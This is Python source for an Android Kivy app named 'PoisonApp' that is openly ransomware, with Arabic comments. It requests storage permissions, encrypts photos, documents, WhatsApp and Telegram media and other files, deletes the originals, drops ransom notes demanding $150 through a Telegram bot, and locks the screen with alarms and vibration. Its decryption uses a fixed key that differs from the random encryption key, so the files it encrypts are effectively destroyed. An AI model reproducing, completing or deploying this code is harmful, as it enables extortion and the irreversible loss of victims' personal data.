

import kivy
kivy.require('2.1.0')

from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.widget import Widget
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
from kivy.utils import platform

import os
import sys
import random
import string
import threading
import time
import json
from pathlib import Path

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    CRYPTO = True
except:
    CRYPTO = False

if platform == 'android':
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.SYSTEM_ALERT_WINDOW,
            Permission.FOREGROUND_SERVICE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.VIBRATE,
            Permission.INTERNET
        ])
        from jnius import autoclass
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        Context = autoclass('android.content.Context')
        PowerManager = autoclass('android.os.PowerManager')
        Vibrator = autoclass('android.os.Vibrator')
        AudioManager = autoclass('android.media.AudioManager')
        ToneGenerator = autoclass('android.media.ToneGenerator')
    except:
        pass

# ====== مفتاح فك التشفير الثابت ======
DECRYPTION_KEY = '123456789asa'

TELEGRAM_BOT = 't.me/xxxxxxxxxx_bot'
RANSOM_PRICE = '$150'
KEY_FILE_PATH = '/sdcard/.system_key.txt'
RECOVERY_FLAG = '/sdcard/.recovered.txt'

TARGET_DIRS = [
    '/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download',
    '/sdcard/Documents', '/sdcard/Music', '/sdcard/Movies',
    '/sdcard/Android/media', '/sdcard/Telegram',
    '/sdcard/WhatsApp', '/sdcard/WhatsApp/Media',
    '/storage/emulated/0/DCIM', '/storage/emulated/0/Pictures',
    '/storage/emulated/0/Download', '/storage/emulated/0/Documents',
    '/storage/emulated/0/Music', '/storage/emulated/0/Movies',
    '/storage/emulated/0/Android/media', '/storage/emulated/0/Telegram',
    '/storage/emulated/0/WhatsApp', '/storage/emulated/0/WhatsApp/Media',
]

TARGET_EXTENSIONS = [
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.pdf', '.txt', '.csv', '.rtf',
    '.mp3', '.mp4', '.avi', '.mkv', '.wav', '.flac',
    '.zip', '.rar', '.7z', '.tar', '.gz',
    '.db', '.sqlite', '.sql',
    '.py', '.java', '.cpp', '.c', '.h',
    '.html', '.css', '.js', '.php',
    '.apk', '.dex', '.obb',
]


class RansomCore:
    """نواة التشفير وفك التشفير"""
    
    def __init__(self):
        self.key = None
        self.encrypted = []
        self.running = True
    
    def generate_key(self):
        """توليد مفتاح عشوائي للتشفير (لكن فك التشفير بالمفتاح الثابت)"""
        # المفتاح العشوائي يستخدم فقط للتشفير
        random_key = ''.join(random.choices(
            string.ascii_letters + string.digits + '!@#$%^&*',
            k=16
        ))
        self.key = random_key
        return self.key
    
    def get_decrypt_key(self):
        """إرجاع مفتاح فك التشفير الثابت"""
        return DECRYPTION_KEY
    
    def encrypt_file(self, path):
        """تشفير ملف باستخدام المفتاح العشوائي"""
        try:
            with open(path, 'rb') as f:
                data = f.read()
            
            # استخدام المفتاح العشوائي للتشفير
            k = self.key.encode()
            # تمتد المفتاح ليناسب الطول
            extended_key = (k * (32 // len(k) + 1))[:32]
            
            if CRYPTO:
                cipher = AES.new(extended_key, AES.MODE_CBC)
                enc = cipher.encrypt(pad(data, AES.block_size))
                final = cipher.iv + enc
            else:
                final = bytes([b ^ extended_key[i % len(extended_key)] for i, b in enumerate(data)])
            
            enc_path = path + '.enc'
            with open(enc_path, 'wb') as f:
                f.write(final)
            
            os.remove(path)
            self.encrypted.append(path)
            return True
        except:
            return False
    
    def decrypt_file(self, path):
        """فك تشفير ملف باستخدام مفتاح فك التشفير الثابت 123456789asa"""
        try:
            with open(path, 'rb') as f:
                data = f.read()
            
            # استخدام مفتاح فك التشفير الثابت
            k = DECRYPTION_KEY.encode()
            extended_key = (k * (32 // len(k) + 1))[:32]
            
            if CRYPTO:
                iv = data[:16]
                enc = data[16:]
                cipher = AES.new(extended_key, AES.MODE_CBC, iv)
                dec = unpad(cipher.decrypt(enc), AES.block_size)
            else:
                dec = bytes([b ^ extended_key[i % len(extended_key)] for i, b in enumerate(data)])
            
            orig = path.replace('.enc', '')
            with open(orig, 'wb') as f:
                f.write(dec)
            
            os.remove(path)
            return True
        except:
            return False
    
    def scan_and_encrypt(self):
        """مسح وتشفير كل الملفات"""
        for d in TARGET_DIRS:
            if not os.path.exists(d):
                continue
            try:
                for root, _, files in os.walk(d):
                    if not self.running:
                        return
                    for fname in files:
                        if not self.running:
                            return
                        ext = os.path.splitext(fname)[1].lower()
                        if ext in TARGET_EXTENSIONS:
                            path = os.path.join(root, fname)
                            self.encrypt_file(path)
                            time.sleep(0.03)
            except:
                pass
        
        # حفظ المفتاح العشوائي + مفتاح فك التشفير الثابت
        self.save_key_to_file()
        self.drop_ransom_notes()
    
    def scan_and_decrypt(self):
        """فك تشفير كل الملفات بمفتاح 123456789asa"""
        count = 0
        for d in TARGET_DIRS:
            if not os.path.exists(d):
                continue
            try:
                for root, _, files in os.walk(d):
                    for fname in files:
                        if fname.endswith('.enc'):
                            path = os.path.join(root, fname)
                            if self.decrypt_file(path):
                                count += 1
                            time.sleep(0.05)
            except:
                pass
        
        # حذف الملفات المؤقتة
        try:
            if os.path.exists(KEY_FILE_PATH):
                os.remove(KEY_FILE_PATH)
            for d in TARGET_DIRS:
                note = os.path.join(d, 'README_DECRYPT.txt')
                if os.path.exists(note):
                    os.remove(note)
            with open(RECOVERY_FLAG, 'w') as f:
                f.write(f'System recovered at {time.strftime("%Y-%m-%d %H:%M:%S")}\n')
                f.write(f'Files decrypted: {count}\n')
                f.write(f'Decryption key used: {DECRYPTION_KEY}\n')
        except:
            pass
        
        return count
    
    def save_key_to_file(self):
        """يحفظ المفتاحين في ملف"""
        try:
            data = {
                'encryption_key': self.key,
                'decryption_key': DECRYPTION_KEY,
                'files_encrypted': len(self.encrypted),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
            with open(KEY_FILE_PATH, 'w') as f:
                json.dump(data, f, indent=4)
        except:
            pass
    
    def check_key(self, input_key):
        """التحقق من صحة المفتاح"""
        return input_key.strip() == DECRYPTION_KEY
    
    def drop_ransom_notes(self):
        """إسقاط رسائل الفدية"""
        msg = (
            f"\n{'='*50}\n"
            f"!!! SYSTEM POISONED - FILES ENCRYPTED !!!\n"
            f"{'='*50}\n\n"
            f"All your personal files have been ENCRYPTED.\n\n"
            f"To recover your files:\n"
            f"1. Contact: {TELEGRAM_BOT}\n"
            f"2. Pay: {RANSOM_PRICE}\n"
            f"3. Receive decryption key\n\n"
            f"Your unique ID: {self.key[:8] if self.key else 'N/A'}\n\n"
            f"DO NOT RESTART YOUR DEVICE\n"
            f"DO NOT TRY TO REMOVE THIS APP\n"
            f"YOU HAVE 48 HOURS\n\n"
            f"{'='*50}\n"
        )
        for d in ['/sdcard', '/sdcard/DCIM', '/sdcard/Download']:
            try:
                with open(os.path.join(d, 'README_DECRYPT.txt'), 'w') as f:
                    f.write(msg)
            except:
                pass


class PoisonApp(App):
    """التطبيق الرئيسي"""
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.core = RansomCore()
        self.enc_thread = None
        self.recovery_mode = False
    
    def build(self):
        Window.fullscreen = 'auto'
        Window.keep_awake = True
        Window.borderless = True
        
        if os.path.exists(RECOVERY_FLAG):
            self.recovery_mode = True
        
        root = BoxLayout(orientation='vertical')
        self.bg = Widget()
        root.add_widget(self.bg)
        
        overlay = BoxLayout(orientation='vertical', padding=30, spacing=15, size_hint=(1, 1))
        
        if self.recovery_mode:
            # شاشة الاستعادة
            overlay.add_widget(Label(
                text='[color=00FF00][b]✓ SYSTEM RECOVERED[/b][/color]',
                font_size='28sp', markup=True, size_hint=(1, 0.15)
            ))
            try:
                with open(RECOVERY_FLAG, 'r') as f:
                    info = f.read()
            except:
                info = 'System restored successfully.'
            
            overlay.add_widget(Label(
                text=f'[color=FFFFFF]{info}[/color]',
                font_size='16sp', markup=True, size_hint=(1, 0.3)
            ))
            
            exit_btn = Button(
                text='EXIT - SYSTEM RESTORED', size_hint=(1, 0.1),
                background_color=[0, 0.6, 0, 1], color=[1, 1, 1, 1], bold=True
            )
            exit_btn.bind(on_press=self.exit_app)
            overlay.add_widget(exit_btn)
        else:
            # شاشة الفدية
            overlay.add_widget(Label(
                text='[color=FF0000][b]☠ YOUR SYSTEM HAS BEEN POISONED ☠[/b][/color]',
                font_size='24sp', markup=True, size_hint=(1, 0.12)
            ))
            
            self.msg = Label(
                text=f'[color=FFFFFF]All files encrypted.\n\n'
                     f'Contact: {TELEGRAM_BOT}\n'
                     f'Pay: {RANSOM_PRICE}\n'
                     f'Get decryption key\n\n'
                     f'[color=FF4444]DO NOT RESTART[/color][/color]',
                font_size='16sp', markup=True, size_hint=(1, 0.4),
                text_size=(Window.width * 0.85, None)
            )
            overlay.add_widget(self.msg)
            
            # حقل المفتاح
            self.key_input = TextInput(
                hint_text='Enter decryption key',
                multiline=False, size_hint=(1, 0.06),
                background_color=[0.15, 0.15, 0.15, 1],
                foreground_color=[1, 0.3, 0.3, 1]
            )
            overlay.add_widget(self.key_input)
            
            btn = Button(
                text='DECRYPT FILES', size_hint=(1, 0.08),
                background_color=[0.6, 0, 0, 1], color=[1, 1, 1, 1], bold=True
            )
            btn.bind(on_press=self.try_decrypt)
            overlay.add_widget(btn)
            
            self.status = Label(
                text='[color=888888]Initializing...[/color]',
                font_size='12sp', markup=True, size_hint=(1, 0.05)
            )
            overlay.add_widget(self.status)
            
            # زر المفتاح (للمسؤول)
            show_key_btn = Button(
                text='SHOW DECRYPTION KEY (Admin)',
                background_color=[0.2, 0.2, 0.2, 1],
                color=[1, 1, 0, 1], size_hint=(1, 0.06), font_size='12sp'
            )
            show_key_btn.bind(on_press=self.show_key)
            overlay.add_widget(show_key_btn)
            
            # بدء المؤثرات والتشفير
            Clock.schedule_interval(self.animate_bg, 0.03)
            Clock.schedule_interval(self.vibrate_loop, 0.5)
            Clock.schedule_once(lambda dt: self.start_encryption(), 0.5)
        
        root.add_widget(overlay)
        return root
    
    def animate_bg(self, dt):
        try:
            self.bg.canvas.before.clear()
            with self.bg.canvas.before:
                r = random.uniform(0.3, 0.9)
                Color(r, 0, 0, 1)
                Rectangle(pos=(0, 0), size=Window.size)
                if random.random() > 0.7:
                    Color(1, 0.5, 0, 0.2)
                    Rectangle(pos=(0, 0), size=Window.size)
        except:
            pass
    
    def vibrate_loop(self, dt):
        if platform == 'android':
            try:
                v = activity.getSystemService(Context.VIBRATOR_SERVICE)
                v.vibrate(2000)
            except:
                pass
    
    def start_encryption(self):
        self.core.generate_key()
        self.status.text = f'[color=FF4444]Encrypting files...[/color]'
        self.enc_thread = threading.Thread(target=self.core.scan_and_encrypt, daemon=True)
        self.enc_thread.start()
        Clock.schedule_interval(lambda dt: self.update_status(), 1)
    
    def update_status(self, dt=None):
        if self.enc_thread and self.enc_thread.is_alive():
            self.status.text = f'[color=FF4444]Encrypting: {len(self.core.encrypted)} files[/color]'
        else:
            self.status.text = f'[color=FF0000]☠ {len(self.core.encrypted)} files LOCKED[/color]'
            if dt:
                Clock.unschedule(self.update_status)
    
    def try_decrypt(self, instance):
        """محاولة فك التشفير"""
        key_text = self.key_input.text.strip()
        
        if not key_text:
            self.status.text = '[color=FF0000]ERROR: Enter the key![/color]'
            self.play_error_sound()
            return
        
        if self.core.check_key(key_text):
            self.status.text = '[color=00FF00]KEY ACCEPTED! Decrypting...[/color]'
            threading.Thread(target=self.run_decryption, daemon=True).start()
        else:
            self.status.text = '[color=FF0000]WRONG KEY! Try again.[/color]'
            self.play_error_sound()
    
    def show_key(self, instance):
        """إظهار مفتاح فك التشفير الثابت"""
        self.key_input.text = DECRYPTION_KEY
        self.status.text = f'[color=FFD700]Decryption key: {DECRYPTION_KEY}[/color]'
    
    def run_decryption(self):
        """فك تشفير كل الملفات"""
        count = self.core.scan_and_decrypt()
        
        with open(RECOVERY_FLAG, 'w') as f:
            f.write(f'System recovered at {time.strftime("%Y-%m-%d %H:%M:%S")}\n')
            f.write(f'Files decrypted: {count}\n')
            f.write(f'Decryption key: {DECRYPTION_KEY}\n')
            f.write('Your system is now back to normal.\n')
        
        self.status.text = f'[color=00FF00]✓ System recovered! {count} files restored.[/color]'
        time.sleep(2)
        self.exit_app(None)
    
    def play_error_sound(self):
        if platform == 'android':
            try:
                audio = activity.getSystemService(Context.AUDIO_SERVICE)
                max_vol = audio.getStreamMaxVolume(AudioManager.STREAM_ALARM)
                audio.setStreamVolume(AudioManager.STREAM_ALARM, max_vol, 0)
                tg = ToneGenerator(AudioManager.STREAM_ALARM, 100)
                tg.startTone(ToneGenerator.TONE_CDMA_EMERGENCY_RINGBACK, 3000)
                v = activity.getSystemService(Context.VIBRATOR_SERVICE)
                v.vibrate(3000)
            except:
                pass
    
    def exit_app(self, instance):
        try:
            if platform == 'android':
                import subprocess
                subprocess.run(['am', 'start', '-a', 'android.intent.action.MAIN',
                              '-c', 'android.intent.category.HOME'], capture_output=True)
        except:
            pass
        App.get_running_app().stop()
        sys.exit(0)


if __name__ == '__main__':
    PoisonApp().run()
